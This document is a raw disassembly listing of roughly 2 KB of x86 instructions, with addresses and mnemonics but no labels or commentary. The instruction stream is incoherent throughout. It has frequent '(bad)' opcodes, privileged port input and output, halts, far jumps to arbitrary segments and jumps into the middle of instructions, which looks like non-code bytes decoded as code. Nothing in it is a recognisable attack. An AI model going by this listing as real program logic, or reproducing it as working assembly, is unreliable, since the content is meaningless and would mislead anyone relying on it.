  4249e0:	in     eax,dx
  4249e1:	or     bh,ah
  4249e3:	out    dx,eax
  4249e4:	lods   eax,DWORD PTR ds:[esi]
  4249e5:	mov    dh,0xc6
  4249e7:	leave  
  4249e8:	out    dx,eax
  4249e9:	cli    
  4249ea:	bnd jmp 0xdb2134b7
  4249f0:	mov    ecx,0xc2feffde
  4249f5:	clc    
  4249f6:	xlat   BYTE PTR ds:[ebx]
  4249f7:	lock in eax,0xe3
  4249fa:	fcom   st(5)
  4249fc:	inc    BYTE PTR ds:0x4c8de
  424a02:	icebp  
  424a03:	jmp    0xcaf7:0xe0cfcca8
  424a0a:	stc    
  424a0b:	sti    
  424a0c:	int3   
  424a0d:	fidivr DWORD PTR [ebx-0x3224150d]
  424a13:	repnz mov ch,0xdc
  424a16:	sar    dh,1
  424a18:	stc    
  424a19:	hlt    
  424a1a:	mov    ecx,0xc8c905dd
  424a20:	adc    bl,al
  424a22:	leave  
  424a23:	out    0xc0,al
  424a25:	(bad)  
  424a26:	mov    esp,0xd3c1c0b2
  424a2b:	mov    dh,0xe5
  424a2d:	(bad)
  424a30:	idiv   BYTE PTR [esi-0x7232321]
  424a36:	add    al,0x3
  424a38:	std    
  424a39:	jmp    0x9194842
  424a3e:	in     eax,0xef
  424a40:	sar    esi,cl
  424a42:	in     eax,0xc6
  424a44:	shl    dh,cl
  424a46:	(bad)  
  424a47:	sti    
  424a48:	aam    0xb2
  424a4a:	hlt    
  424a4b:	fdiv   st,st(6)
  424a4d:	repz (bad) 
  424a4f:	mov    ebp,0xc8bad4ed
  424a54:	mov    esi,0xd4d5f8f9
  424a59:	fmul   st,st(3)
  424a5b:	cli    
  424a5c:	jmp    0x424a38
  424a5e:	fsubrp st(2),st
  424a60:	or     esi,ecx
  424a62:	out    0xd8,al
  424a64:	mov    ebp,0xcaf3f4ed
  424a69:	(bad)  
  424a6a:	in     eax,0xd8
  424a6c:	(bad)  
  424a6d:	call   ebp
  424a6f:	jmp    edx
  424a71:	repz not esi
  424a74:	ret    
  424a75:	add    bl,al
  424a77:	hlt    
  424a78:	(bad)  
  424a7a:	rol    BYTE PTR [esi],0x4
  424a7d:	in     al,0xd9
  424a7f:	fdivr  st,st(0)
  424a81:	out    0xae,al
  424a83:	stos   BYTE PTR es:[edi],al
  424a84:	in     eax,dx
  424a85:	out    0xf1,al
  424a87:	fcmovnu st,st(2)
  424a89:	in     eax,0xce
  424a8b:	in     eax,0xf8
  424a8d:	mov    ch,0xdd
  424a8f:	iret   
  424a90:	stc    
  424a91:	fxch   st(0)
  424a93:	inc    bl
  424a95:	shl    ebp,0xc3
  424a98:	retf   
  424a99:	fiadd  DWORD PTR [edi]
  424a9b:	or     al,BYTE PTR [ebx]
  424a9d:	call   0xe21151a8
  424aa2:	test   eax,0xc4a4bec2
  424aa7:	jecxz  0x424a83
  424aa9:	rol    ebp,1
  424aab:	sar    al,1
  424aad:	(bad)
  424ab0:	(bad)  
  424ab1:	(bad)  
  424ab2:	mov    esi,0xcdfef9db
  424ab7:	out    0xff,al
  424ab9:	in     eax,0xe0
  424abb:	fcmove st,st(7)
  424abd:	push   cs
  424abe:	or     edx,edi
  424ac0:	pop    es
  424ac1:	push   es
  424ac2:	repnz jmp 0xf4ea:0xd0c4bcf0
  424aca:	leave  
  424acb:	idiv   ebx
  424acd:	mov    ebx,0xdde3f6be
  424ad2:	add    edx,ebx
  424ad4:	in     al,dx
  424ad5:	loope  0x424ad6
  424ad7:	in     al,dx
  424ad8:	ftst   
  424ada:	add    cl,bl
  424adc:	loop   0x424ae8
  424ade:	loop   0x424add
  424ae0:	vpmulhuw xmm5,xmm2,XMMWORD PTR [esi-0x15524833]
  424ae8:	(bad)  
  424ae9:	in     al,dx
  424aea:	in     al,0xf7
  424aec:	vpslld ymm7,ymm6,XMMWORD PTR [ebx+eiz*8-0x293c0429]
  424af5:	fdivp  st(4),st
  424af7:	cli    
  424af8:	(bad)
  424afc:	jecxz  0x424af7
  424afe:	jmp    0xd0232deb
  424b03:	fsub   st,st(5)
  424b05:	mov    esp,0xaccef5dc
  424b0a:	xbegin 0xd0353dfa
  424b10:	int    0xef
  424b12:	int    0xba
  424b14:	pop    es
  424b15:	xlat   BYTE PTR ds:[ebx]
  424b16:	std    
  424b17:	rol    DWORD PTR [ecx],1
  424b19:	mov    ebx,0xeae5e70f
  424b1f:	out    dx,al
  424b20:	leave  
  424b21:	std    
  424b22:	shl    DWORD PTR [ecx-0x8122924],cl
  424b28:	lods   eax,DWORD PTR ds:[esi]
  424b29:	aam    0xf8
  424b2b:	icebp  
  424b2c:	lds    esi,FWORD PTR [eax-0x46254929]
  424b32:	mov    ecx,0xe1b8d3e0
  424b37:	(bad)  
  424b39:	or     ch,bl
  424b3b:	out    dx,eax
  424b3c:	fiadd  DWORD PTR [ebx]
  424b3e:	out    dx,al
  424b3f:	dec    BYTE PTR [esi]
  424b41:	jmp    0xb0dc:0xb7ceeabf
  424b48:	int3   
  424b49:	hlt    
  424b4a:	mov    ebx,0xcbe5fbc5
  424b4f:	mov    ah,0xf1
  424b51:	neg    al
  424b53:	icebp  
  424b54:	shl    dl,1
  424b56:	(bad)  
  424b57:	cli    
  424b58:	loopne 0x424b54
  424b5a:	(bad)  
  424b5b:	loop   0x424b48
  424b5d:	clc    
  424b5e:	leave  
  424b5f:	or     cl,cl
  424b61:	adc    esp,ebp
  424b63:	(bad)
  424b66:	mov    dl,0xad
  424b68:	enter  0xd2b6,0xc7
  424b6c:	xlat   BYTE PTR ds:[ebx]
  424b6d:	out    dx,eax
  424b6e:	mov    edx,0x1d9f2d9
  424b73:	add    eax,edi
  424b75:	add    DWORD PTR [edx],eax
  424b77:	ret    
  424b78:	faddp  st(1),st
  424b7a:	retf   0xd7df
  424b7d:	or     ch,bh
  424b7f:	add    eax,edi
  424b81:	fsub   st(1),st
  424b83:	test   al,0xa5
  424b85:	lods   eax,DWORD PTR ds:[esi]
  424b86:	xlat   BYTE PTR ds:[ebx]
  424b87:	aad    0xac
  424b89:	in     al,dx
  424b8a:	idiv   ecx
  424b8c:	mov    dh,0xac
  424b8e:	mov    ecx,0xd5f9d7d6
  424b93:	into   
  424b94:	loope  0x424b9d
  424b96:	mov    esp,0xf0f9f0c6
  424b9b:	in     al,0x4
  424b9d:	fisttp QWORD PTR [edx]
  424b9f:	fsub   st,st(0)
  424ba1:	(bad)  
  424ba2:	(bad)  
  424ba3:	leave  
  424ba4:	in     al,0xe5
  424ba6:	rcl    esp,1
  424ba8:	out    0xb7,al
  424baa:	retf   0xf9ef
  424bad:	cmc    
  424bae:	mov    edx,0xddf7fad2
  424bb3:	repz mov ecx,0xf207bbf1
  424bb9:	jmp    0xeec8:0xe3cbdbcb
  424bc0:	jmp    0xc0f41cd8
  424bc5:	jecxz  0x424bab
  424bc7:	shr    DWORD PTR [ecx-0x174b1220],0xde
  424bce:	(bad)  
  424bcf:	les    eax,FWORD PTR [ebx]
  424bd1:	mov    ebx,0xfaf8e3c3
  424bd6:	loope  0x424bb1
  424bd8:	rol    DWORD PTR [edx],cl
  424bda:	fsub   st,st(0)
  424bdc:	shl    ah,0xa
  424bdf:	retf   0xf90f
  424be2:	in     al,dx
  424be3:	shr    al,1
  424be5:	jmp    0xb1143d9d
  424bea:	fcmovnbe st,st(3)
  424bec:	fnstcw WORD PTR [ebx-0x15234522]
  424bf2:	cli    
  424bf3:	shl    bl,0xd5
  424bf6:	add    ebx,ebp
  424bf8:	fcomp  st(0)
  424bfa:	call   esp
  424bfc:	jmp    0x424bbe
  424bfe:	out    0xdb,al
  424c00:	out    dx,al
  424c01:	fdivrp st(2),st
  424c03:	out    dx,eax
  424c04:	mov    bl,0xc5
  424c06:	loopne 0x424bb6
  424c08:	out    dx,eax
  424c09:	mov    edx,0xb7f3f4f6
  424c0e:	fdiv   st,st(5)
  424c10:	lock cmc 
  424c12:	inc    cl
  424c14:	out    0x5,eax
  424c16:	hlt    
  424c17:	fsubr  st(7),st
  424c19:	faddp  st(0),st
  424c1b:	or     BYTE PTR [esi],cl
  424c1d:	out    dx,al
  424c1e:	jecxz  0x424c20
  424c20:	jmp    0xc120170a
  424c25:	(bad)  
  424c26:	out    0xd7,al
  424c28:	loopne 0x424c0c
  424c2a:	mov    bh,0xc5
  424c2c:	mov    ch,0xe5
  424c2e:	lock in al,0xfc
  424c31:	into   
  424c32:	stc    
  424c33:	mov    ecx,0xf2e4d8bc
  424c38:	add    eax,0xe3c0e5b8
  424c3d:	stc    
  424c3e:	faddp  st(6),st
  424c40:	out    0xde,eax
  424c42:	lock mov esi,0xbcd0eacc
  424c48:	out    0xb1,al
  424c4a:	(bad)  
  424c4b:	out    0xd5,al
  424c4d:	mov    dh,0xf4
  424c4f:	hlt    
  424c50:	std    
  424c51:	aad    0xdf
  424c53:	icebp  
  424c54:	loop   0x424c3b
  424c56:	clc    
  424c57:	push   es
  424c58:	in     eax,0xc6
  424c5a:	out    0xf7,al
  424c5c:	fsubp  st(2),st
  424c5e:	fsubr  st,st(7)
  424c60:	retf   0xee11
  424c63:	jmp    0x424c30
  424c65:	into   
  424c66:	mov    cl,0xee
  424c68:	(bad)  
  424c69:	hlt    
  424c6a:	retf   
  424c6b:	jmp    0x424c1d
  424c6d:	enter  0xd7c9,0xfa
  424c71:	test   ebx,0xfdf1ffb8
  424c77:	push   es
  424c78:	fild   WORD PTR [edx]
  424c7a:	(bad)  
  424c7c:	ffree  st(5)
  424c7e:	fdivp  st(7),st
  424c80:	or     eax,0xf2d0e505
  424c85:	les    esi,FWORD PTR [ebx-0x3b192f3b]
  424c8b:	mov    dl,0xd0
  424c8d:	mov    ecx,0xc2d3f9ca
  424c92:	int3   
  424c93:	test   BYTE PTR [edi],0xcd
  424c96:	ret    0xd0d4
  424c99:	mov    eax,0x2e5f7cb
  424c9e:	(bad)  
  424c9f:	cli    
  424ca0:	jmp    esp
  424ca2:	(bad)  
  424ca3:	enter  0xbdaf,0xb3
  424ca7:	(bad)  
  424ca8:	retf   
  424ca9:	div    DWORD PTR [edx-0x9354a36]
  424caf:	in     al,0xba
  424cb1:	idiv   edx
  424cb3:	stc    
  424cb4:	sar    DWORD PTR [eax-0x3bfe0945],1
  424cba:	pop    es
  424cbb:	sti    
  424cbc:	fdiv   st(7),st
  424cbe:	fcomp  st(5)
  424cc0:	enter  0xc0e1,0xec
  424cc4:	(bad)  
  424cc6:	(bad)  
  424cc7:	mul    bh
  424cc9:	mov    dh,0xe7
  424ccb:	mov    cl,0xb6
  424ccd:	(bad)  
  424ccf:	mov    dl,0xf4
  424cd1:	std    
  424cd2:	ret    0xc1f8
  424cd5:	mov    ah,0xf7
  424cd7:	jecxz  0x424caa
  424cd9:	in     al,0xfd
  424cdb:	imul   eax
  424cdd:	add    eax,0xd8d3fed5
  424ce2:	out    dx,eax
  424ce3:	fucomip st,st(3)
  424ce5:	scas   al,BYTE PTR es:[edi]
  424ce6:	(bad)  
  424ce7:	mov    cl,0xe1
  424ce9:	int3   
  424cea:	int    0xbb
  424cec:	mov    bh,0xd4
  424cee:	cld    
  424cef:	int    0xd1
  424cf1:	ret    0xf3d8
  424cf4:	cmc    
  424cf5:	xlat   BYTE PTR ds:[ebx]
  424cf6:	fadd   st,st(1)
  424cf8:	clc    
  424cf9:	ret    
  424cfa:	loop   0x424ce0
  424cfc:	dec    BYTE PTR [esi]
  424cfe:	hlt    
  424cff:	fild   DWORD PTR [ebp*8-0x192e1c4d]
  424d06:	in     al,0xe9
  424d08:	jmp    0x424cfd
  424d0a:	sti    
  424d0b:	mov    cl,0xfe
  424d0d:	(bad)  
  424d0e:	lock (bad) 
  424d10:	aam    0xba
  424d12:	hlt    
  424d13:	mul    cl
  424d15:	inc    DWORD PTR [eax]
  424d17:	add    eax,0xe7cae907
  424d1c:	or     bh,dl
  424d1e:	ret    
  424d1f:	loop   0x424d2b
  424d21:	jecxz  0x424cce
  424d23:	leave  
  424d24:	scas   al,BYTE PTR es:[edi]
  424d25:	(bad)  
  424d26:	repnz (bad) 
  424d28:	in     eax,dx
  424d29:	into   
  424d2a:	repz mov ecx,0xceefd4b7
  424d30:	repz in al,dx
  424d32:	in     eax,dx
  424d33:	rcl    ecx,1
  424d35:	xlat   BYTE PTR ds:[ebx]
  424d36:	icebp  
  424d37:	mov    esi,0xda03e6eb
  424d3c:	add    ecx,edi
  424d3e:	jecxz  0x424d0a
  424d40:	or     ch,bh
  424d42:	lds    esp,FWORD PTR [esi-0x30282e3d]
  424d48:	not    cl
  424d4a:	in     eax,dx
  424d4b:	retf   
  424d4c:	mov    ch,0xd8
  424d4e:	stc    
  424d4f:	mov    esi,0x7f0e1ed
  424d54:	hlt    
  424d55:	add    bh,bh
  424d57:	loop   0x424d4b
  424d59:	jmp    0x424d36
  424d5b:	stc    
  424d5c:	(bad)  
  424d5e:	in     al,dx
  424d5f:	out    dx,eax
  424d60:	fdivrp st(3),st
  424d62:	test   al,0xc5
  424d64:	loop   0x424d55
  424d66:	int    0xac
  424d68:	ret    0xafb5
  424d6b:	leave  
  424d6c:	out    0xfa,al
  424d6e:	mov    edi,0xe1dccdfd
  424d73:	xlat   BYTE PTR ds:[ebx]
  424d74:	into   
  424d75:	(bad)  
  424d77:	(bad)  
  424d78:	mov    ebp,0xd6caf9e6
  424d7d:	leave  
  424d7e:	mov    dl,0xef
  424d81:	loope  0x424d67
  424d83:	mov    bl,0xcd
  424d85:	lock scas al,BYTE PTR es:[edi]
  424d87:	lods   al,BYTE PTR ds:[esi]
  424d88:	(bad)  
  424d89:	shr    ah,cl
  424d8b:	hlt    
  424d8c:	neg    bh
  424d8e:	icebp  
  424d8f:	in     eax,dx
  424d90:	fdivrp st(3),st
  424d92:	in     eax,dx
  424d93:	(bad)  
  424d95:	mov    BYTE PTR [edx],0xd4
  424d98:	icebp  
  424d99:	add    bh,ah
  424d9b:	in     eax,0xde
  424d9d:	add    ebx,ecx
  424d9f:	int3   
  424da0:	adc    eax,DWORD PTR [esi]
  424da2:	mov    cl,0xdd
  424da4:	(bad)  
  424da5:	mov    cl,0xc4
  424da7:	hlt    
  424da8:	out    0xe5,eax
  424daa:	retf   0xb8e8
  424dad:	idiv   bh
  424daf:	mov    ebp,0xe2c8d1f2
  424db4:	mov    esi,0xe6c300e7
  424db9:	les    eax,FWORD PTR [ebx]
  424dbb:	enter  0xcff8,0xf4
  424dbf:	add    al,0xef
  424dc1:	les    edi,FWORD PTR [edi-0x141f0e24]
  424dc7:	icebp  
  424dc8:	sar    edx,cl
  424dca:	shl    bl,0xc7
  424dcd:	(bad)  
  424dce:	aam    0xcb
  424dd0:	sti    
  424dd1:	std    
  424dd2:	enter  0xdad5,0xe1
  424dd6:	mov    esp,0xd0c5eac6
  424ddb:	add    esp,esi
  424ddd:	hlt    
  424dde:	clc    
  424ddf:	leave  
  424de0:	or     esp,esi
  424de2:	lds    ebp,FWORD PTR [esi-0x281e233a]
  424de8:	(bad)  
  424de9:	in     eax,0xe1
  424deb:	(bad)  
  424dec:	in     al,dx
  424ded:	leave  
  424dee:	test   ah,0xfb
  424df1:	add    DWORD PTR [ebx-0x1a1a2e28],edi
  424df7:	mov    ebp,0xc5f1d4d8
  424dfc:	std    
  424dfd:	fsubr  st(4),st
  424dff:	iret   
  424e00:	in     al,0xc0
  424e02:	(bad)  
  424e04:	scas   al,BYTE PTR es:[edi]
  424e05:	scas   eax,DWORD PTR es:[edi]
  424e06:	loopne 0x424dd4
  424e08:	mov    dh,0xda
  424e0a:	scas   eax,DWORD PTR es:[edi]
  424e0b:	aad    0xdf
  424e0d:	call   0x33c480e
  424e12:	(bad)  
  424e14:	(bad)  
  424e15:	shl    ecx,cl
  424e17:	inc    esp
  424e19:	lock add al,ch
  424e1c:	add    al,0xee
  424e1e:	psllq  mm5,mm5
  424e21:	or     dh,al
  424e23:	loopne 0x424e09
  424e25:	ror    edx,0xf3
  424e28:	mov    ch,0xd3
  424e2a:	repnz shl esi,cl
  424e2d:	sti    
  424e2e:	mov    edx,0xf6f4bef1
  424e33:	fsub   st,st(6)
  424e35:	aam    0xc1
  424e37:	push   es
  424e38:	cli    
  424e39:	fneni(8087 only) 
  424e3b:	in     eax,0x2
  424e3d:	mov    esp,0xfee7cee4
  424e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e43:	loope  0x424e08
  424e45:	enter  0xeccc,0xcd
  424e49:	cli    
  424e4a:	clc    
  424e4b:	mov    ecx,0xddd5ddf0
  424e50:	retf   
  424e51:	aam    0x0
  424e53:	mov    ecx,0xd1f603ef
  424e58:	(bad)  
  424e59:	hlt    
  424e5a:	(bad)  
  424e5b:	hlt    
  424e5c:	ror    DWORD PTR [eax],0xdd
  424e5f:	clc    
  424e60:	leave  
  424e61:	iret   
  424e62:	jmp    0xe70f4658
  424e67:	lods   eax,DWORD PTR ds:[esi]
  424e68:	mov    bl,0xac
  424e6a:	cli    
  424e6b:	xlat   BYTE PTR ds:[ebx]
  424e6c:	mov    ch,0xfe
  424e6e:	mov    bh,0xb9
  424e70:	repnz repnz out dx,eax
  424e73:	repz in eax,dx
  424e75:	shl    ah,1
  424e77:	loopne 0x424e7d
  424e79:	add    al,0x4
  424e7b:	add    ecx,DWORD PTR [ebx]
  424e7d:	ror    bh,0xcf
  424e80:	retf   0xe005
  424e83:	repz jmp 0x424e54
  424e86:	call   0xf1033440
  424e8b:	(bad)  
  424e8c:	out    0xc6,al
  424e8e:	mov    ah,0xd5
  424e90:	sti    
  424e91:	loop   0x424e7b
  424e93:	cli    
  424e94:	add    eax,DWORD PTR [edx]
  424e96:	sar    ebx,0xe0
  424e99:	jmp    0x424e80
  424e9b:	push   es
  424e9c:	loope  0x424e8c
  424e9e:	stc    
  424e9f:	sti    
  424ea0:	(bad)  
  424ea2:	mov    bl,0xec
  424ea4:	mov    edi,0xecf3bcc5
  424ea9:	mov    dh,0xb0
  424eab:	fcmovbe st,st(0)
  424ead:	mov    bh,0xf5
  424eaf:	out    dx,al
  424eb0:	in     al,dx
  424eb1:	leave  
  424eb2:	sti    
  424eb3:	(bad)  
  424eb5:	aad    0xc5
  424eb7:	out    0xdc,eax
  424eb9:	(bad)  
  424eba:	(bad)  
  424ebb:	ror    BYTE PTR [esi],1
  424ebd:	fiadd  DWORD PTR ds:0xdce1d9e0
  424ec3:	out    dx,al
  424ec4:	int3   
  424ec5:	ret    0xb6ac
  424ec8:	in     eax,0xe7
  424eca:	(bad)  
  424ecb:	enter  0xeed5,0xb3
  424ecf:	sti    
  424ed0:	aam    0xea
  424ed2:	jecxz  0x424eb0
  424ed4:	cli    
  424ed5:	fstp   st(6)
  424ed7:	loopne 0x424ead
  424ed9:	(bad)  
  424eda:	cmc    
  424edb:	(bad)  
  424ede:	fstp   st(1)
  424ee0:	stc    
  424ee1:	add    cl,dl
  424ee3:	shr    ecx,0xcd
  424ee6:	enter  0xc8cf,0xb2
  424eea:	mov    ah,0xfb
  424eec:	out    0xf7,eax
  424eee:	jmp    0xbb2004c0
  424ef3:	rcr    ebp,0xe7
  424ef6:	int    0xf2
  424ef8:	mov    esp,0x90ffd03
  424efd:	or     cl,dl
  424eff:	fsubr  st,st(3)
  424f01:	in     eax,0xc2
  424f03:	out    dx,eax
  424f04:	into   
  424f05:	mov    esi,0xdbefe2b2
  424f0a:	shr    ch,0xc4
  424f0d:	jmp    0x424f0b
  424f0f:	int3   
  424f10:	mov    ah,0xee
  424f12:	(bad)  
  424f14:	jecxz  0x424f02
  424f16:	int    0xd1
  424f18:	fld    QWORD PTR [ecx]
  424f1a:	jmp    0x24a2b1d
  424f1f:	out    dx,eax
  424f20:	cld    
  424f21:	adc    ebp,DWORD PTR [edx-0x4a4f3d44]
  424f27:	leave  
  424f28:	mov    dh,0xf6
  424f2a:	scas   eax,DWORD PTR es:[edi]
  424f2b:	rcl    ch,1
  424f2d:	iret   
  424f2e:	idiv   BYTE PTR [ecx-0x30474b35]
  424f34:	rol    dh,0xd1
  424f37:	mov    ch,0xc5
  424f3a:	add    al,0x4
  424f3c:	fimul  DWORD PTR [edx]
  424f3e:	loope  0x424f1b
  424f40:	les    ecx,FWORD PTR ds:0xa4cbcbc8
  424f46:	ret    
  424f47:	shl    cl,1
  424f49:	rcr    ebx,1
  424f4b:	rol    dh,cl
  424f4d:	retf   0xfad1
  424f50:	std    
  424f51:	(bad)  
  424f53:	enter  0xc007,0xc7
  424f57:	in     al,0xc4
  424f59:	mov    eax,0xbce0da02
  424f5e:	iret   
  424f5f:	(bad)  
  424f61:	in     eax,dx
  424f62:	int3   
  424f63:	loop   0x424f0e
  424f65:	in     eax,0xe7
  424f67:	xlat   BYTE PTR ds:[ebx]
  424f68:	int3   
  424f69:	cli    
  424f6a:	scas   eax,DWORD PTR es:[edi]
  424f6b:	fcomip st,st(0)
  424f6d:	leave  
  424f6e:	aam    0xe9
  424f70:	aam    0xd4
  424f72:	shl    dl,cl
  424f74:	out    0xb4,al
  424f76:	add    bl,bh
  424f78:	icebp  
  424f79:	rol    BYTE PTR [ecx],0xde
  424f7c:	sti    
  424f7d:	in     eax,dx
  424f7e:	aad    0xc9
  424f80:	jmp    0xc4e8:0xe1bef3c0
  424f87:	call   0xe0374679
  424f8c:	stc    
  424f8d:	push   esi
  424f8f:	retf   
  424f90:	aad    0xdc
  424f92:	iret   
  424f93:	jecxz  0x424f9b
  424f95:	add    esi,edi
  424f97:	inc    eax
  424f99:	jmp    0x83993
  424f9e:	cli    
  424f9f:	iret   
  424fa0:	add    eax,0xddbfaa11
  424fa5:	ret    
  424fa6:	loopne 0x424f8b
  424fa8:	sti    
  424fa9:	rol    bh,cl
  424fab:	imul   ecx
  424fad:	in     al,dx
  424fae:	vpand  ymm7,ymm1,YMMWORD PTR [ebp+0x5f4bfcd]
  424fb6:	rol    ebp,0xe3
  424fb9:	cmc    
  424fba:	in     eax,0xe9
  424fbc:	in     al,0xf4
  424fbe:	fisttp WORD PTR [ebx]
  424fc0:	push   es
  424fc1:	or     ch,BYTE PTR [esi-0xc2a3d38]
  424fc7:	mov    bl,0xac
  424fc9:	leave  
  424fca:	loope  0x424f7d
  424fcc:	repz in al,dx
  424fce:	mov    ecx,0xfcd5ebbd
  424fd3:	lock stc 
  424fd5:	fcmovnu st,st(0)
  424fd7:	or     ecx,ebx
  424fd9:	stc    
  424fda:	fcmovne st,st(2)
  424fdc:	retf   
  424fdd:	fiadd  WORD PTR [edx]
  424fdf:	cld    
  424fe0:	retf   0xd1e7
  424fe3:	scas   al,BYTE PTR es:[edi]
  424fe4:	loope  0x424f98
  424fe6:	xlat   BYTE PTR ds:[ebx]
  424fe7:	lods   al,BYTE PTR ds:[esi]
  424fe8:	(bad)  
  424fe9:	aad    0xe8
  424feb:	out    0xdf,eax
  424fed:	lock lock mov ch,0xf3
  424ff1:	icebp  
  424ff2:	fdecstp 
  424ff4:	(bad)  
  424ff5:	sti    
  424ff6:	hlt    
  424ff7:	stc    
  424ff8:	add    ecx,DWORD PTR [edx]
  424ffa:	stc    
  424ffb:	fadd   QWORD PTR [edi+ecx*8]
  424ffe:	vpsllq ymm1,ymm3,XMMWORD PTR [edi]
  425002:	mov    edi,0xcdd3d0ea
  425007:	in     al,dx
  425008:	mov    cl,0xcb
  42500a:	loopne 0x424fbe
  42500c:	jmp    0xb7d9:0xdaf1ede6
  425013:	int    0xcc
  425015:	idiv   ch
  425017:	cld    
  425018:	retf   
  425019:	fdiv   st,st(5)
  42501b:	mov    esi,0xd9c5e9c7
  425020:	repz repnz fdivr QWORD PTR [eax-0xd3f2e09]
  425028:	(bad)
  42502b:	out    dx,al
  42502c:	repz into 
  42502e:	into   
  42502f:	(bad)  
  425030:	in     eax,dx
  425031:	mov    edi,0xec03b6e3
  425036:	pop    es
  425037:	sti    
  425038:	not    ah
  42503a:	ret    
  42503b:	ret    0xc9f4
  42503e:	in     al,0xe4
  425040:	call   0xf7f43c45
  425045:	icebp  
  425046:	icebp  
  425047:	cmc    
  425048:	shl    DWORD PTR [eax+ebp*8-0xd094e13],0xfb
  425050:	sar    cl,cl
  425052:	mov    ebx,0xecf4c1cf
  425057:	sti    
  425058:	out    0xc0,eax
  42505a:	out    0xdd,eax
  42505c:	sti    
  42505d:	sti    
  42505e:	fmul   DWORD PTR [edi]
  425060:	jmp    edi
  425062:	fldcw  WORD PTR [ebp-0x36143a53]
  425068:	(bad)  
  425069:	in     eax,0xf3
  42506b:	imul   edx
  42506d:	out    dx,eax
  42506e:	aam    0xe9
  425070:	mov    ch,0xc9
  425072:	test   esp,0xe6ecd9e3
  425078:	aam    0xdd
  42507a:	rcr    edi,0xdb
  42507d:	iret   
  42507e:	out    0x9,al
  425080:	fpatan 
  425082:	repnz loop 0x42505c
  425085:	(bad)  
  425086:	shl    bl,1
  425088:	mov    al,0xa8
  42508a:	into   
  42508b:	lock (bad) 
  42508e:	(bad)
  425091:	int    0xed
  425093:	clc    
  425094:	repnz frstpm(287 only) 
  425097:	add    dh,ah
  425099:	ret    0xf7d8
  42509c:	cld    
  42509d:	cli    
  42509e:	loop   0x42507d
  4250a0:	in     eax,0x2
  4250a2:	lods   al,BYTE PTR ds:[esi]
  4250a3:	out    dx,al
  4250a4:	into   
  4250a5:	iret   
  4250a6:	mov    cl,0xd6
  4250a8:	iret   
  4250a9:	mov    bl,0xe5
  4250ab:	shr    ah,cl
  4250ad:	retf   
  4250ae:	(bad)  
  4250af:	clc    
  4250b0:	mov    ch,0xb4
  4250b2:	repnz loop 0x4250bc
  4250b5:	fcmovnb st,st(2)
  4250b7:	std    
  4250b8:	fadd   st,st(2)
  4250ba:	(bad)
  4250bd:	call   0xc114ec9
  4250c2:	(bad)  
  4250c3:	test   al,0xe9
  4250c5:	scas   al,BYTE PTR es:[edi]
  4250c6:	loope  0x42509e
  4250c8:	les    esi,FWORD PTR [edi-0x2f284734]
  4250ce:	mov    ebp,0xcdc2efea
  4250d3:	(bad)  
  4250d5:	fst    st(1)
  4250d7:	mov    esp,0xe8fbdce1
  4250dc:	aam    0xfd
  4250de:	add    ecx,esi
  4250e0:	(bad)  
  4250e2:	test   eax,0xf2afd6ae
  4250e7:	repz aam 0xd2
  4250ea:	retf   
  4250eb:	lock mov edi,0xdeedeceb
  4250f1:	mov    ebp,0xe2fb00e1
  4250f6:	loope  0x4250f3
  4250f8:	mul    edi
  4250fa:	loopne 0x4250f1
  4250fc:	stc    
  4250fd:	add    esi,ebx
  4250ff:	psubusw mm1,mm7
  425102:	fbld   TBYTE PTR [esi-0x4952221e]
  425108:	into   
  425109:	rcr    ecx,1
  42510b:	in     al,dx
  42510c:	out    dx,al
  42510d:	hlt    
  42510e:	mov    ah,0xfb
  425110:	fsub   st(7),st
  425112:	std    
  425113:	mov    eax,0xdaf7c3c3
  425118:	rcr    esi,0xc5
  42511b:	jecxz  0x4250f5
  42511d:	into   
  42511e:	in     al,0xe
  425120:	loop   0x42512d
  425122:	mov    ecx,0xc9e9d0c6
  425127:	loop   0x4250d6
  425129:	in     al,0xc6
  42512b:	out    dx,eax
  42512c:	(bad)  
  42512d:	mov    al,0xcc
  42512f:	(bad)  
  425130:	cld    
  425131:	call   0xd90612ff
  425136:	loopne 0x425128
  425138:	shr    ebx,0xfd
  42513b:	aad    0xf6
  42513d:	out    0xe4,al
  42513f:	out    0xf8,al
  425141:	jmp    0x42512c
  425143:	(bad)  
  425144:	mov    edi,0xe2b1b1cf
  425149:	lock jmp 0xf7332c19
  42514f:	mov    edx,0xdcf6f4f5
  425154:	fadd   st,st(3)
  425156:	int    0xfa
  425158:	aam    0xc1
  42515a:	sti    
  42515b:	or     esi,ebx
  42515d:	jmp    0xeeaf:0x4efed0b
  425164:	(bad)  
  425165:	in     al,dx
  425166:	call   0xd5381735
  42516b:	clc    
  42516c:	jmp    0xf4f2:0xc3f6f8ec
  425173:	(bad)  
  425174:	into   
  425175:	cld    
  425176:	icebp  
  425177:	add    eax,0xc5c1e5
  42517c:	pop    es
  42517d:	out    dx,eax
  42517e:	leave  
  42517f:	or     eax,ecx
  425181:	fcmovu st,st(6)
  425183:	lods   eax,DWORD PTR ds:[esi]
  425184:	mov    edi,0xc7e6b7e3
  425189:	in     eax,dx
  42518a:	call   0xd5fb4964
  42518f:	clc    
  425190:	mov    esp,0xedfdd6d0
  425195:	sar    ebp,1
  425197:	mov    edx,0x4e5dfda
  42519c:	(bad)
  42519f:	(bad)  
  4251a0:	out    dx,al
  4251a1:	(bad)  
  4251a2:	mov    esi,0xddaccdcd
  4251a7:	jmp    0xfef3:0xf5e5e0f1
  4251ae:	aad    0xcb
  4251b0:	mov    edx,0xdae0cffa
  4251b5:	repnz repnz shl esi,cl
  4251b9:	sar    edi,0xe2
  4251bc:	in     al,0xc0
  4251be:	add    al,0xdb
  4251c0:	out    dx,eax
  4251c1:	out    0xf0,eax
  4251c3:	fsub   st,st(6)
  4251c5:	mov    esp,0xe7fad5e3
  4251ca:	(bad)
  4251cd:	test   ebx,0xd2caf6f3
  4251d3:	ret    
  4251d4:	rol    edx,1
  4251d6:	(bad)  
  4251d8:	mov    ecx,0xc4c4dcdc
  4251dd:	in     eax,0x7
  4251df:	(bad)  
  4251e0:	dec    BYTE PTR [edx+esi*4]
  4251e3:	loope  0x425191
  4251e5:	loopne 0x4251ad
  4251e7:	shl    al,0xa8
  4251ea:	fsubr  st,st(5)
  4251ec:	repz fidivr WORD PTR [ebp-0x2404440a]
  4251f3:	add    eax,edx
  4251f5:	mov    edi,0xfdf2f7db
  4251fa:	fiadd  WORD PTR [edi]
  4251fc:	add    cl,bl
  4251fe:	or     eax,0xe5c4fdfb
  425203:	mov    bl,0xac
  425205:	retf   0xadd4
  425208:	iret   
  425209:	cli    
  42520a:	mov    edx,0xefdbb5d5
  42520f:	iret   
